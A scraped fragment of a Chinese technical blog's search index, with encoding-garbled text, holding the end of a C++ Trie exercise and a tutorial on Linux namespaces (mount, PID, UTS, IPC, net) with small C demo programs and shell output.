&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;cstring&amp;gt;

using namespace std;

int main()
{
    int n;
    int son[100010][26], cnt[100010], idx = 0;
    memset(son, 0, sizeof son);
    memset(cnt, 0, sizeof cnt);
    cin &amp;gt;&amp;gt; n;
    
    while(n--)
    {
        string option, str;
        cin &amp;gt;&amp;gt; option &amp;gt;&amp;gt; str;

        if(option == &amp;quot;I&amp;quot;)
        {
            int p = 0;
            for(int i = 0; i &amp;lt; str.length(); i ++)
            {
                if(son[p][str[i]-&#39;a&#39;] == 0) 
                    son[p][str[i]-&#39;a&#39;] = ++ idx;
                p = son[p][str[i]-&#39;a&#39;];
            }
            cnt[p] ++;
        }
        else
        {
            int p = 0;
            int i;
            for(i = 0; i &amp;lt; str.length(); i ++)
            {
                if(son[p][str[i]-&#39;a&#39;] == 0) 
                {
                    cout &amp;lt;&amp;lt; 0 &amp;lt;&amp;lt; endl;
                    break;
                }
                p = son[p][str[i]-&#39;a&#39;];
            }
            if(i==str.length())
                cout &amp;lt;&amp;lt; cnt[p] &amp;lt;&amp;lt; endl;
        }
    }
    
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
">ã€æ•°æ®ç»“æ„ã€‘Trieæ ‘(å­˜å‚¨å­—ç¬¦ä¸²)</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/rong-qi-namespace/"" data-c="
          &lt;p&gt;namespaceä¸ºè¿›ç¨‹åˆ›å»ºç‹¬ç«‹éš”ç¦»çš„ç¯å¢ƒï¼Œéš”ç¦»åçš„æ¯ä¸ªnamespaceçœ‹ä¸Šå»åƒæ˜¯ä¸€ä¸ªç‹¬ç«‹çš„linuxç³»ç»Ÿã€‚&lt;/p&gt;
&lt;h2 id=&#34;è¿›ç¨‹ç»“æ„ä½“ä¸­çš„namespaceæŒ‡é’ˆ&#34;&gt;è¿›ç¨‹ç»“æ„ä½“ä¸­çš„namespaceæŒ‡é’ˆ&lt;/h2&gt;
&lt;p&gt;ä¸€ä¸ªè¿›ç¨‹å¯ä»¥å±äºå¤šä¸ªnamespaceï¼Œåœ¨task_structä¸­æœ‰ä¸€ä¸ªæŒ‡å‘namespaceç»“æ„ä½“çš„æŒ‡é’ˆnsproxyã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;struct nsproxy{
    atomic_t count;
    struct uts_namspace *uts_ns;
    struct ipc_namspace *ipc_ns;
    struct mnt_namspace *mnt_ns;
    struct pid_namspace *pid_ns_for_children;
    struct net *net_ns;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¦‚æœä¸æŒ‡å®šnsï¼Œé‚£ä¹ˆåˆ›å»ºè¿›ç¨‹æ—¶ä¼šæŒ‡å®šä¸€ä¸ªé»˜è®¤çš„nsï¼šinit_nsproxy&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;struct nsproxy init_nsproxy = {
    .count = ATOMIC_INTI(1),
    .uts_ns = &amp;amp;init_uts_ns,
    #if defined(CONFIG_POSIX_MQUEUE) || defined(CONFIG_SYSVIPC)
        .ipc_ns = &amp;amp;init_ipc_ns,
    #endif
    .mnt_ns = NULL,
    .pid_ns_for_children = &amp;amp;init_pid_ns,
    #ifdef CONFIG_NET
        .net_ns = &amp;amp;init_net,
    #endif
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;namespaceç›¸å…³çš„ç³»ç»Ÿè°ƒç”¨&#34;&gt;namespaceç›¸å…³çš„ç³»ç»Ÿè°ƒç”¨&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. clone()&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int clone(int (*fn)(void *), void *child_stack,
    int flags, void *arg, ...
    /* pid_t *ptid, void *newtls, pid_t *ctid */ )
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åˆ›å»ºæ–°çš„è¿›ç¨‹ï¼ŒåŒæ—¶åˆ›å»ºæ–°çš„namespaceï¼Œå°†æ–°åˆ›å»ºçš„å­è¿›ç¨‹åŠ å…¥åˆ°æ–°åˆ›å»ºçš„namespaceä¸­ã€‚&lt;br&gt;
&lt;strong&gt;2. unshare()&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int unshare(int flags);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;unshare()ä¸ä¼šåˆ›å»ºæ–°çš„è¿›ç¨‹ï¼Œä½†ä¼šæŠŠå½“å‰è¿›ç¨‹åŠ å…¥åˆ°æ–°åˆ›å»ºçš„namespaceä¸­ï¼Œ&lt;br&gt;
&lt;strong&gt;3. setns()&lt;/strong&gt;&lt;br&gt;
setnsæ˜¯å°†ä¸€ä¸ªè¿›ç¨‹åŠ å…¥åˆ°å·²ç»å­˜åœ¨çš„namespaceä¸­ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int setns(int fd, int nstype);
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;å‚æ•°fdè¡¨ç¤ºæˆ‘ä»¬è¦åŠ å…¥çš„namespaceçš„æ–‡ä»¶æè¿°ç¬¦ï¼Œå¦‚ï¼š/proc/[pid]/nsä¸‹é¢å¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦ã€‚&lt;/li&gt;
&lt;li&gt;å‚æ•°nstypeè®©è°ƒç”¨è€…å¯ä»¥å»æ£€æŸ¥fdæŒ‡å‘çš„namespaceç±»å‹æ˜¯å¦ç¬¦åˆæˆ‘ä»¬å®é™…çš„è¦æ±‚ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;mount-namespace&#34;&gt;mount namespace&lt;/h2&gt;
&lt;p&gt;Mount namespaceé€šè¿‡éš”ç¦»æ–‡ä»¶ç³»ç»ŸæŒ‚è½½ç‚¹å¯¹éš”ç¦»æ–‡ä»¶ç³»ç»Ÿæä¾›æ”¯æŒã€‚éš”ç¦»åï¼Œä¸åŒçš„mount namespaceä¸­çš„æ–‡ä»¶ç»“æ„å‘ç”Ÿå˜åŒ–ä¹Ÿäº’ä¸å½±å“ã€‚ä½ å¯ä»¥é€šè¿‡/proc/[pid]/mountsæŸ¥çœ‹åˆ°æ‰€æœ‰æŒ‚è½½åœ¨å½“å‰namesapceä¸­çš„æ–‡ä»¶ç³»ç»Ÿï¼Œè¿˜å¯ä»¥é€šè¿‡/proc/[pid]/mountstatsçœ‹åˆ°mount namespaceä¸­æ–‡ä»¶è®¾å¤‡çš„ç»Ÿè®¡ä¿¡æ¯ï¼ŒåŒ…æ‹¬æŒ‚è½½çš„æ–‡ä»¶åç§°ï¼Œæ–‡ä»¶ç³»ç»Ÿç±»å‹ï¼ŒæŒ‚è½½ä½ç½®ç­‰ç­‰ã€‚&lt;/p&gt;
&lt;p&gt;è¿›ç¨‹åœ¨åˆ›å»ºmount namespaceçš„æ—¶å€™ï¼Œä¼šæŠŠå½“å‰ç»“æ„å¤åˆ¶ç»™æ–°çš„namespaceã€‚ æ–°çš„namespaceä¸­çš„æ‰€æœ‰mountæ“ä½œéƒ½å½±å“è‡ªèº«çš„æ–‡ä»¶ç³»ç»Ÿï¼Œè€Œå¯¹å¤–ç•Œä¸ä¼šäº§ç”Ÿä»»ä½•å½±å“ã€‚è¿™æ ·åšå°±ä¸¥æ ¼åœ°å®ç°äº†éš”ç¦»ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#define _GNU_SOURCE
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;sys/wait.h&amp;gt;
#include &amp;lt;sys/mount.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sched.h&amp;gt;
#include &amp;lt;signal.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

#define STACK_SIZE (1024 * 1024)
// sync primitive
int checkpoint[2];
static char child_stack[STACK_SIZE];
char* const child_args[] = {
	&amp;quot;/bin/bash&amp;quot;,
	NULL
};

int child_main(void* arg) {
	char c;
	// init sync primitive
	close(checkpoint[1]);
	// setup hostname
	sethostname(&amp;quot;changed namespace&amp;quot;, 12);
	// remount &amp;quot;/proc&amp;quot; to get accurate &amp;quot;top&amp;quot; &amp;amp;&amp;amp; &amp;quot;ps&amp;quot; output
	mount(&amp;quot;proc&amp;quot;, &amp;quot;/proc&amp;quot;, &amp;quot;proc&amp;quot;, 0, NULL);
	// wait...
	read(checkpoint[0], &amp;amp;c, 1);
	execv(child_args[0], child_args);
	printf(&amp;quot;Ooops\n&amp;quot;);
	return 1;
}
int main() {
	// init sync primitive
	pipe(checkpoint);
	int child_pid = clone(child_main, child_stack+STACK_SIZE,
	  CLONE_NEWUTS | CLONE_NEWIPC | CLONE_NEWPID | CLONE_NEWNS | SIGCHLD, NULL);
	// further init here (nothing yet)
	// signal &amp;quot;done&amp;quot;
	close(checkpoint[1]);
	waitpid(child_pid, NULL, 0);
	printf(&amp;quot;quit!\n&amp;quot;);
	return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[root@localhost ~]# gcc -Wall mntns.c -o mnt &amp;amp;&amp;amp; ./mnt
[root@changed name ~]# ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.7  0.0 122804  4100 pts/0    S    13:27   0:00 /bin/bash
root        30  0.0  0.0 151056  1816 pts/0    R+   13:28   0:00 ps aux
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;pid-namespace&#34;&gt;pid namespace&lt;/h2&gt;
&lt;p&gt;PID namespaceéš”ç¦»éå¸¸å®ç”¨ï¼Œå®ƒå¯¹è¿›ç¨‹PIDé‡æ–°æ ‡å·,å³ä¸¤ä¸ªä¸åŒçš„namespaceä¸‹çš„è¿›ç¨‹å¯ä»¥æ‹¥æœ‰åŒä¸€ä¸ªPIDã€‚æ¯ä¸€ä¸ªPID namespaceéƒ½æœ‰å­—çš„è®¡æ•°ç¨‹åºã€‚å†…æ ¸ä¸ºæ‰€æœ‰çš„PID namespaceç»´æŠ¤äº†ä¸€ä¸ªæ ‘çŠ¶ç»“æ„ï¼Œæœ€é¡¶å±‚çš„æ˜¯ç³»ç»Ÿåˆå§‹æ—¶åˆ›å»ºçš„,å³root namespaceã€‚ä»–åˆ›å»ºçš„æ–°çš„PID namespaceç§°child namespaceã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œä¸åŒçš„PID namespaceä¼šå½¢æˆä¸€ä¸ªç­‰çº§çš„ä½“ç³»ã€‚æ‰€å±çš„çˆ¶èŠ‚ç‚¹å¯ä»¥çœ‹åˆ°å­èŠ‚ç‚¹ä¸­çš„è¿›ç¨‹ï¼Œå¹¶å¯ä»¥é€šè¿‡ä¿¡å·ç­‰æ–¹å¼å¯¹å­èŠ‚ç‚¹ä¸­çš„è¿›ç¨‹äº§ç”Ÿå½±å“ã€‚åè¿‡æ¥ï¼Œå­èŠ‚ç‚¹ä¸èƒ½çœ‹åˆ°çˆ¶èŠ‚ç‚¹PID namespaceä¸­çš„ä»»ä½•å†…å®¹ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;æ¯ä¸ªPID namespaceä¸­çš„ç¬¬ä¸€ä¸ªè¿›ç¨‹â€œPID 1â€œï¼Œéƒ½ä¼šåƒä¼ ç»ŸLinuxä¸­çš„initè¿›ç¨‹ä¸€æ ·æ‹¥æœ‰ç‰¹æƒï¼Œèµ·ç‰¹æ®Šä½œç”¨ã€‚&lt;/li&gt;
&lt;li&gt;ä¸€ä¸ªnamespaceä¸­çš„è¿›ç¨‹ï¼Œä¸å¯èƒ½é€šè¿‡killæˆ–ptraceå½±å“çˆ¶èŠ‚ç‚¹æˆ–è€…å…„å¼ŸèŠ‚ç‚¹ä¸­çš„è¿›ç¨‹ï¼Œå› ä¸ºå…¶ä»–èŠ‚ç‚¹çš„PIDåœ¨è¿™ä¸ªnamespaceä¸­æ²¡æœ‰ä»»ä½•æ„ä¹‰ã€‚&lt;/li&gt;
&lt;li&gt;å¦‚æœä½ åœ¨æ–°çš„PID namespaceä¸­é‡æ–°æŒ‚è½½/procæ–‡ä»¶ç³»ç»Ÿï¼Œä¼šå‘ç°å…¶ä¸‹åªæ˜¾ç¤ºåŒå±ä¸€ä¸ªPID namespaceä¸­çš„å…¶ä»–è¿›ç¨‹ã€‚&lt;/li&gt;
&lt;li&gt;åœ¨root namespaceä¸­å¯ä»¥çœ‹åˆ°æ‰€æœ‰çš„è¿›ç¨‹ï¼Œå¹¶ä¸”é€’å½’åŒ…å«æ‰€æœ‰å­èŠ‚ç‚¹ä¸­çš„è¿›ç¨‹ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#define _GNU_SOURCE
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;sys/wait.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sched.h&amp;gt;
#include &amp;lt;signal.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;


#define STACK_SIZE (1024*1024)

static char child_stack[STACK_SIZE];
char* const child_args[] = {
	&amp;quot;/bin/bash&amp;quot;,
	NULL
};

int child_main(void* args){
	printf(&amp;quot;in child process!\n&amp;quot;);
	sethostname(&amp;quot;changed namespace&amp;quot;, 12);
	execv(child_args[0], child_args);
	return 1;
}

int main(){
	printf(&amp;quot;program begin: \n&amp;quot;);
	int child_pid = clone(child_main, child_stack + STACK_SIZE, SIGCHLD | CLONE_NEWUTS | CLONE_NEWIPC, NULL);
	waitpid(child_pid, NULL, 0);
	printf(&amp;quot;quit\n&amp;quot;);
	return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[root@localhost ~]# gcc -Wall pid.c -o pid &amp;amp;&amp;amp; ./pid
program begin:
in child process!
[root@changed name ~]# ps aux
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿è¡Œps auxå‘½ä»¤æ¥æŸ¥çœ‹æ˜¯å¦å®ç°äº†PID namespaceçš„éš”ç¦»ï¼›å‘ç°è¿˜ä¼šçœ‹åˆ°å®¿ä¸»æœºä¸Šçš„æ‰€æœ‰çš„è¿›ç¨‹ã€‚è¿™æ˜¯ç”±äºæ²¡æœ‰å¯¹æ–‡ä»¶ç³»ç»Ÿè¿›è¡Œéš”ç¦»ï¼Œps/topä¹‹ç±»çš„å‘½ä»¤è°ƒç”¨çš„æ˜¯çœŸå®ç³»ç»Ÿä¸‹çš„/procæ–‡ä»¶å†…å®¹ï¼Œçœ‹åˆ°çš„è‡ªç„¶æ˜¯æ‰€æœ‰çš„è¿›ç¨‹ã€‚&lt;/p&gt;
&lt;p&gt;è¿è¡Œä¸‹é¢çš„mountå‘½ä»¤æ¥å¯¹/proc æ–‡ä»¶ç³»ç»Ÿè¿›è¡Œéš”ç¦»:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@changed name ~]# mount -t proc proc /proc
[root@changed name ~]# ps uax
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0 122804  4172 pts/1    S    20:39   0:00 /bin/bash
root        37  0.0  0.0   5184   340 pts/1    S    20:40   0:00 ./uts
root        38  0.0  0.0 122804  4176 pts/1    S    20:40   0:00 /bin/bash
root        68  0.0  0.0 151056  1816 pts/1    R+   20:42   0:00 ps uax
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;uts-namespace&#34;&gt;uts namespace&lt;/h2&gt;
&lt;p&gt;UTS namespaceæä¾›äº†ä¸»æœºåå’ŒåŸŸåçš„éš”ç¦»ï¼Œè¿™æ ·æ¯ä¸€ä¸ªå®¹å™¨å°±å¯ä»¥æ‹¥æœ‰ç‹¬ç«‹çš„ä¸»æœºåå’ŒåŸŸåï¼Œåœ¨ç½‘ç»œä¸Šå¯ä»¥è¢«è§†ä¸ºä¸€ä¸ªç‹¬ç«‹çš„èŠ‚ç‚¹è€Œéå®¿ä¸»æœºä¸Šçš„ä¸€ä¸ªè¿›ç¨‹ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#define _GNU_SOURCE
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;sys/wait.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sched.h&amp;gt;
#include &amp;lt;signal.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;


#define STACK_SIZE (1024*1024)

static char child_stack[STACK_SIZE];
char* const child_args[] = {
	&amp;quot;/bin/bash&amp;quot;,
	NULL
};

int child_main(void* args){
	printf(&amp;quot;in child process!\n&amp;quot;);
	sethostname(&amp;quot;changed namespace&amp;quot;, 12);
	execv(child_args[0], child_args);
	return 1;
}

int main(){
	printf(&amp;quot;program begin: \n&amp;quot;);
	int child_pid = clone(child_main, child_stack + STACK_SIZE, SIGCHLD|CLONE_NEWUTS, NULL);
	waitpid(child_pid, NULL, 0);
	printf(&amp;quot;quit\n&amp;quot;);
	return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[root@localhost ~]# gcc -Wall uts.c -o uts &amp;amp;&amp;amp; ./uts
program begin:
in child process!
[root@changed name ~]# exit
exit
quit
[root@localhost ~]#
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;ipc-namespace&#34;&gt;ipc namespace&lt;/h2&gt;
&lt;p&gt;å®¹å™¨ä¸­è¿›ç¨‹é—´çš„é€šä¿¡é‡‡ç”¨çš„æ–¹å¼åŒ…æ‹¬: ä¿¡å·é‡ï¼Œæ¶ˆæ¯é˜Ÿåˆ—å’Œå…±äº«å†…å­˜ã€‚ä¸è™šæ‹Ÿæœºä¸åŒçš„æ˜¯ï¼Œå®¹å™¨å†…éƒ¨è¿›ç¨‹é—´é€šä¿¡å¯¹å®¿ä¸»æœºæ¥è¯´ï¼Œå®é™…ä¸Šæ˜¯å…·æœ‰ç›¸åŒçš„PID namespaceä¸­çš„è¿›ç¨‹é—´é€šä¿¡ï¼Œå› æ­¤éœ€è¦ä¸€ä¸ªè€Œå”¯ä¸€çš„æ ‡è¯†ç¬¦æ¥è¿›è¡ŒåŒºåˆ«ã€‚ç”³è¯·IPCèµ„æºå°±ç”³è¯·äº†è¿™æ ·ä¸€ä¸ªå…¨å±€å”¯ä¸€çš„32ä½IDï¼Œæ‰€ä»¥IPC namespaceä¸­å®é™…ä¸ŠåŒ…å«äº†ç³»ç»ŸIPCæ ‡è¯†ç¬¦ä»¥åŠå®ç°POSIXæ¶ˆæ¯é˜Ÿåˆ—çš„æ–‡ä»¶ç³»ç»Ÿã€‚åœ¨åŒä¸€ä¸ªIPC namespaceä¸‹çš„è¿›ç¨‹å½¼æ­¤å¯è§ï¼Œè€Œä¸å…¶ä»–çš„IPC namespaceä¸‹çš„è¿›ç¨‹åˆ™äº’ç›¸ä¸å¯è§ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#define _GNU_SOURCE
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;sys/wait.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sched.h&amp;gt;
#include &amp;lt;signal.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;


#define STACK_SIZE (1024*1024)

static char child_stack[STACK_SIZE];
char* const child_args[] = {
	&amp;quot;/bin/bash&amp;quot;,
	NULL
};

int child_main(void* args){
	printf(&amp;quot;in child process!\n&amp;quot;);
	sethostname(&amp;quot;changed namespace&amp;quot;, 12);
	execv(child_args[0], child_args);
	return 1;
}

int main(){
	printf(&amp;quot;program begin: \n&amp;quot;);
	int child_pid = clone(child_main, child_stack + STACK_SIZE, SIGCHLD | CLONE_NEWUTS | CLONE_NEWIPC, NULL);
	waitpid(child_pid, NULL, 0);
	printf(&amp;quot;quit\n&amp;quot;);
	return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;é¦–å…ˆæˆ‘ä»¬å…ˆä½¿ç”¨ipcmk -Qå‘½ä»¤åˆ›å»ºä¸€ä¸ªqueue:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[root@locahost ~]# ipcmk -Q
æ¶ˆæ¯é˜Ÿåˆ— idï¼š32769
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ä½¿ç”¨ipcs -qæŸ¥çœ‹queueæ˜¯å¦åˆ›å»ºæˆåŠŸ:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[root@localhost ~]# ipcs -q
--------- æ¶ˆæ¯é˜Ÿåˆ— -----------
é”®        msqid      æ‹¥æœ‰è€…  æƒé™     å·²ç”¨å­—èŠ‚æ•° æ¶ˆæ¯
0x6d2ba356 0          root       644        0            0
0xe88b6229 32769      root       644        0            0
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ç¼–è¯‘å¹¶è¿è¡Œipc.cä»£ç å¯¹IPCè¿›è¡Œéš”ç¦»å¹¶è¿›è¡ŒéªŒè¯:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[root@localhost~]# gcc -Wall ipc.c -o ipc &amp;amp;&amp;amp; ./ipc
program begin:
in child process!
[root@changed name ~]# ipcs -q
--------- æ¶ˆæ¯é˜Ÿåˆ— -----------
é”®        msqid      æ‹¥æœ‰è€…  æƒé™     å·²ç”¨å­—èŠ‚æ•° æ¶ˆæ¯
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä»è¿è¡Œçš„ç»“æœæ¥çœ‹ï¼Œå·²ç»æ‰¾ä¸åˆ°åŸå…ˆå£°æ˜çš„message queueï¼Œå®ç°äº†IPCçš„éš”ç¦»ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;net-namespace&#34;&gt;net namespace&lt;/h2&gt;
&lt;p&gt;Net namespaceä¸»è¦æä¾›å…³äºç½‘ç»œèµ„æºçš„éš”ç¦»ï¼ŒåŒ…æ‹¬ç½‘ç»œè®¾å¤‡IPv4å’ŒIPv6åè®®æ ˆï¼ŒIPè·¯ç”±è¡¨ï¼Œé˜²ç«å¢™ï¼Œ/proc/netç›®å½•ï¼Œ/sys/class/netç›®å½•ï¼Œç«¯å£ç­‰ç­‰ã€‚ä¸€ä¸ªç‰©ç†çš„ç½‘ç»œè®¾å¤‡æœ€å¤šå­˜åœ¨ä¸€ä¸ªnet namespaceä¸­ï¼Œä½ å¯ä»¥åˆ›å»ºveth pair(è™šæ‹Ÿç½‘è·¯è®¾å¤‡å¯¹:æœ‰ä¸¤ç«¯å¦‚æœæœ‰æ•°æ®ä»ä¸€ç«¯ä¼ å…¥å¦ä¸€ç«¯ä¹Ÿèƒ½æ”¶åˆ°ï¼Œåä¹‹äº¦ç„¶)åœ¨ä¸åŒçš„network namespaceé—´åˆ›å»ºé€šé“ä¾æ¬¡è¾¾åˆ°é€šä¿¡çš„ç›®çš„ã€‚&lt;/p&gt;
&lt;p&gt;ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œç‰©ç†ç½‘ç»œè®¾å¤‡éƒ½åˆ†é…åœ¨æœ€åˆçš„root namespaceä¸­ï¼Œä½†æ˜¯å¦‚æœä½ æœ‰å¤šå—ç‰©ç†ç½‘å¡ï¼Œä¹Ÿå¯ä»¥æŠŠå…¶ä¸­ä¸€å—æˆ–å¤šå—åˆ†é…ç»™æ–°åˆ›å»ºçš„network namespaceã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå½“æ–°åˆ›å»ºçš„network namespaceè¢«é‡Šæ”¾æ—¶ï¼ˆæ‰€æœ‰å†…éƒ¨çš„è¿›ç¨‹éƒ½ç»ˆæ­¢å¹¶ä¸”namespaceæ–‡ä»¶æ²¡æœ‰è¢«æŒ‚è½½æˆ–æ‰“å¼€ï¼‰ï¼Œåœ¨è¿™ä¸ªnamespaceä¸­çš„ç‰©ç†ç½‘å¡ä¼šè¿”å›åˆ°root namespaceè€Œéåˆ›å»ºè¯¥è¿›ç¨‹çš„çˆ¶è¿›ç¨‹æ‰€åœ¨çš„network namespaceã€‚&lt;/p&gt;
&lt;p&gt;å½“æˆ‘ä»¬è¯´åˆ°network namespaceæ—¶ï¼Œå…¶å®æˆ‘ä»¬æŒ‡çš„æœªå¿…æ˜¯çœŸæ­£çš„ç½‘ç»œéš”ç¦»ï¼Œè€Œæ˜¯æŠŠç½‘ç»œç‹¬ç«‹å‡ºæ¥ï¼Œç»™å¤–éƒ¨ç”¨æˆ·ä¸€ç§é€æ˜çš„æ„Ÿè§‰ï¼Œä»¿ä½›è·Ÿå¦å¤–ä¸€ä¸ªç½‘ç»œå®ä½“åœ¨è¿›è¡Œé€šä¿¡ã€‚ä¸ºäº†è¾¾åˆ°è¿™ä¸ªç›®çš„ï¼Œå®¹å™¨çš„ç»å…¸åšæ³•å°±æ˜¯åˆ›å»ºä¸€ä¸ªveth pairï¼Œä¸€ç«¯æ”¾ç½®åœ¨æ–°çš„namespaceä¸­ï¼Œé€šå¸¸å‘½åä¸ºeth0ï¼Œä¸€ç«¯æ”¾åœ¨åŸå…ˆçš„namespaceä¸­è¿æ¥ç‰©ç†ç½‘ç»œè®¾å¤‡ï¼Œå†é€šè¿‡ç½‘æ¡¥æŠŠåˆ«çš„è®¾å¤‡è¿æ¥è¿›æ¥æˆ–è€…è¿›è¡Œè·¯ç”±è½¬å‘ï¼Œä»¥æ­¤ç½‘ç»œå®ç°é€šä¿¡çš„ç›®çš„ã€‚&lt;/p&gt;
&lt;p&gt;ä¹Ÿè®¸æœ‰è¯»è€…ä¼šå¥½å¥‡ï¼Œåœ¨å»ºç«‹èµ·veth pairä¹‹å‰ï¼Œæ–°æ—§namespaceè¯¥å¦‚ä½•é€šä¿¡å‘¢ï¼Ÿç­”æ¡ˆæ˜¯pipeï¼ˆç®¡é“ï¼‰ã€‚æˆ‘ä»¬ä»¥Docker Daemonåœ¨å¯åŠ¨å®¹å™¨dockerinitçš„è¿‡ç¨‹ä¸ºä¾‹ã€‚Docker Daemonåœ¨å®¿ä¸»æœºä¸Šè´Ÿè´£åˆ›å»ºè¿™ä¸ªveth pairï¼Œé€šè¿‡netlinkè°ƒç”¨ï¼ŒæŠŠä¸€ç«¯ç»‘å®šåˆ°docker0ç½‘æ¡¥ä¸Šï¼Œä¸€ç«¯è¿è¿›æ–°å»ºçš„network namespaceè¿›ç¨‹ä¸­ã€‚å»ºç«‹çš„è¿‡ç¨‹ä¸­ï¼ŒDocker Daemonå’Œdockerinitå°±é€šè¿‡pipeè¿›è¡Œé€šä¿¡ï¼Œå½“Docker Daemonå®Œæˆveth-pairçš„åˆ›å»ºä¹‹å‰ï¼Œdockerinitåœ¨ç®¡é“çš„å¦ä¸€ç«¯å¾ªç¯ç­‰å¾…ï¼Œç›´åˆ°ç®¡é“å¦ä¸€ç«¯ä¼ æ¥Docker Daemonå…³äºvethè®¾å¤‡çš„ä¿¡æ¯ï¼Œå¹¶å…³é—­ç®¡é“ã€‚dockerinitæ‰ç»“æŸç­‰å¾…çš„è¿‡ç¨‹ï¼Œå¹¶æŠŠå®ƒçš„â€œeth0â€å¯åŠ¨èµ·æ¥ã€‚&lt;/p&gt;
&lt;p&gt;è·Ÿå…¶ä»–namespaceç±»ä¼¼ï¼Œå¯¹network namespaceçš„ä½¿ç”¨å…¶å®å°±æ˜¯åœ¨åˆ›å»ºçš„æ—¶å€™æ·»åŠ CLONE_NEWNETæ ‡è¯†ä½ã€‚ä¹Ÿå¯ä»¥é€šè¿‡å‘½ä»¤è¡Œå·¥å…·ipåˆ›å»ºnetwork namespaceã€‚åœ¨ä»£ç ä¸­å»ºç«‹å’Œæµ‹è¯•network namespaceè¾ƒä¸ºå¤æ‚ï¼Œæ‰€ä»¥ä¸‹æ–‡ä¸»è¦é€šè¿‡ipå‘½ä»¤ç›´è§‚çš„æ„Ÿå—æ•´ä¸ªnetwork namespaceç½‘ç»œå»ºç«‹å’Œé…ç½®çš„è¿‡ç¨‹ã€‚&lt;/p&gt;
&lt;p&gt;é¦–å…ˆæˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªå‘½åä¸ºtest_nsçš„network namespace:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@localhost ~]# ip netns add test_ns
&lt;/code&gt;&lt;/pre&gt;
